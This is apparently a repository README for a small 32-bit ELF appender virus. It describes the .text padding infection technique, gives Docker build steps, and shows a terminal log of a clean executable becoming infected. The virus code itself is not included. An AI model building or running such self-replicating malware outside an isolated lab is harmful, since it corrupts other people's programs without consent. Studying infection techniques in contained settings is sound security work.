ELF x86 appender virus in 800b
===============================
The virus infects every infectable elf executable in the current directory using [Silvio's](https://en.wikipedia.org/wiki/Silvio_Cesare) classic .text section padding technique. Without debugging symbols it comes in at 800b

* mmap host for improved efficiency 
* virus length using jmp trick so no bootstrapping
* overwrites ELF header entry point
* 32bit only

Compile
-------

The virus runs in docker although you do not have to use docker. To compile the image run 

`docker build -t virus .`. 

To run the image use the `docker.sh` script. Once inside the docker container do `cd /virus/ && make` to compile. The virus code and host will be stored in `/tmp`

```
18:57 $ ./docker.sh

root@5d3f53a66f94:/# cd /virus/
root@5d3f53a66f94:/virus# make
root@5d3f53a66f94:/virus# cd /tmp/

root@5d3f53a66f94:/tmp# ./info.sh host
**** host ****
cb261f205ba23d2fcc49fecbcd91e072  host
entry point address:              0x8048320
host is clean

root@5d3f53a66f94:/tmp# ./info.sh appender
**** appender ****
81cb4c926b9da8cea19806f1fda2c658  appender
entry point address:              0x80482f0
appender is infected

root@203ff78bcad2:/tmp# ./host
hello world
root@203ff78bcad2:/tmp# ./appender
infect
root@203ff78bcad2:/tmp# ./host
infect
hello world

root@5d3f53a66f94:/tmp# ./info.sh host
**** host ****
72f68dd92d78201725a85b4b00254848  host
entry point address:              0x80485bd
host is infected
```
